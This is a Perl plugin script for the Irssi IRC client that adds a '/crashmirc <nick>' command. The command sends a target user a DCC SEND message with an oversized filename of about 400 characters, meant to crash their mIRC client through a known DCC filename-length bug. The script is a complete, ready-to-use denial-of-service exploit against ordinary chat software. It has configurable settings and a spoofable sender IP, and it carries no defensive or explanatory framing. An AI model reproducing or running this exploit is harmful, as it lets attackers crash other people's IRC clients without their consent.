#!/usr/bin/perl
####################################################################
##
## Lässt mIRC Clienten mit dem DCC-Dateinamen-zu-lang-Bug abstürzen
##
## http://www.securityfocus.com/bid/8818
## http://www.securityfocus.com/bid/8880
## written by psi (www.ghcif.de)
##
####################################################################

use Irssi;
use strict;

use vars qw($VERSION %IRSSI);

$VERSION = "0.3";
%IRSSI = (
     authors		=> 'Philipp Sieweck',
     description	=> 'Crashs another mIRC client using the ' .
                           'dcc-filename-too-long bug',
     license		=> 'GPL',
     contact		=> 'psieweck@freenet.de (PGP UserID: 4496DDC2)',
     version		=> $VERSION
);

#sub generate_random_string($)
#{
#     my $string_length = shift;
#     my $str = '';
#     my $strchr = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOQRSTUVWXYZ';
#
#     for (my $i = 0; $i < $string_length; $i++) {
#	  my $ri = int(rand(length($strchr)));
#	  $str .= substr($strchr, $ri, 1);
#     }
#
#     return $str;
#}

sub generate_crash_string($)
{
     my $string_length = shift;
     my $str;

     for (my $i = 0; $i < $string_length/2; $i++) {
	  $str .= 'a ';
     }
     $str .= 'a';
     return $str;
}
sub create_dcc_send_message($$$$$)
{
     my ($nick, $ip, $filename, $filesize, $port) = @_;
     my @ip_chunks = $ip =~ /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
     my $cip = $ip_chunks[0]*256*256*256 
             + $ip_chunks[1]*256*256
	     + $ip_chunks[2]*256
             + $ip_chunks[3];

     return "PRIVMSG $nick :DCC SEND $filename $cip $port $filesize";
}

sub crash_mirc($$$)
{
     my ($data, $server, $witem) = @_;

     unless ($server) {
	  print CLIENTCRAP '%W[%R!%W]%n Nicht mit Server verbunden!';
	  return;
     }

     $data =~ /^(\S+)/;
     my $nick = $1;
     unless ($nick) {
	  print CLIENTCRAP '%W[%R!%W]%n Syntax: /crashmirc <nick>';
	  return;
     }
     
     my $port = Irssi::settings_get_int('mirc_dcc_crash_dccport');
     my $filesize = Irssi::settings_get_int('mirc_dcc_crash_filesize');
     my $sender_ip = Irssi::settings_get_str('mirc_dcc_crash_sender_ip');
     my $filename_length = Irssi::settings_get_int('mirc_dcc_crash_filename_length');
     my $filename_suffix = Irssi::settings_get_str('mirc_dcc_crash_filename_suffix');

     print CLIENTCRAP '%W[%B-%W]%n Sende DCC CrashMsg an %W' . $nick . '%n';
     my $raw_str = &create_dcc_send_message($nick, $sender_ip, 
#		    &generate_random_string($filename_length).$filename_suffix,
                    '"'.&generate_crash_string($filename_length).$filename_suffix.'"',
		    $filesize, $port);
     $server->send_raw($raw_str);
}

Irssi::settings_add_int('mirc_dcc_crash', 'mirc_dcc_crash_dccport', 34234);
Irssi::settings_add_int('mirc_dcc_crash', 'mirc_dcc_crash_filesize', 32234234);
Irssi::settings_add_str('mirc_dcc_crash', 'mirc_dcc_crash_sender_ip', '80.34.2.234');
Irssi::settings_add_str('mirc_dcc_crash', 'mirc_dcc_crash_filename_suffix', '');
Irssi::settings_add_int('mirc_dcc_crash', 'mirc_dcc_crash_filename_length', 400);

Irssi::command_bind('crashmirc', 'crash_mirc');

